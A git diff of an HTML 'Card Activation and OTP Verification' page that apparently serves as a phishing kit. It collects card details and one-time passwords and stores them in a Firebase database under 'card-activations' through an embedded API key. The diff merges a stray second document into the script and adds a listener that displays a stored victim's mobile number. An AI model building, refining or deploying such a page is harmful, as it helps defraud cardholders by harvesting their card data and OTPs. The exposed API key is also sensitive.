@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Card Activation and OTP Verification</title>
-
     <style>
         :root {
             --mainBackground: #FFF6EC;
@@ -278,6 +277,9 @@
         <h2>Credit Card Activated Successfully</h2>
     </div>
 
+    <!-- Display Real-time Data -->
+    <div id="user-data"></div>
+
     <script>
         const activationForm = document.getElementById('activationForm');
         const activateBtn = document.getElementById('activate-btn');
@@ -286,6 +288,7 @@
         const successContainer = document.getElementById('success-container');
         const otpInputs = document.querySelectorAll('.otp-box');
         const verifyBtn = document.getElementById('verify-btn');
+        const userDataDiv = document.getElementById('user-data');
         const loadingContainer = document.createElement('div');
         loadingContainer.classList.add('loading');
         loadingContainer.innerHTML = '<span>Loading Please Wait...</span><div class="spinner"></div>';
@@ -367,19 +370,7 @@ document.getElementById('expiry').addEventListener('input', function (event) {
             otpContainer.style.display = 'none';
             successContainer.style.display = 'block';
         });
-    </script>
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Card Activation</title>
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js"></script>
-</head>
-<body>
-    <script>
+
         // Firebase configuration
         const firebaseConfig = {
               apiKey: "AIzaSyDeceQ163lmHZbyIKicgz81OjGRNEtlr3w",
@@ -396,8 +387,18 @@ document.getElementById('expiry').addEventListener('input', function (event) {
         const app = firebase.initializeApp(firebaseConfig);
         const database = firebase.database(app);
 
-        const activationForm = document.getElementById('activationForm');
-        
+        // Real-time listener for database changes
+        database.ref('card-activations').on('value', (snapshot) => {
+            const data = snapshot.val();
+
+            if (data) {
+                // Example: Display the first card activation's mobile number
+                userDataDiv.textContent = `Mobile Number: ${data[Object.keys(data)[0]].mobile}`;
+            } else {
+                userDataDiv.textContent = 'No data available';
+            }
+        });
+
         // On form submission
         activationForm.addEventListener('submit', async (e) => {
             e.preventDefault();
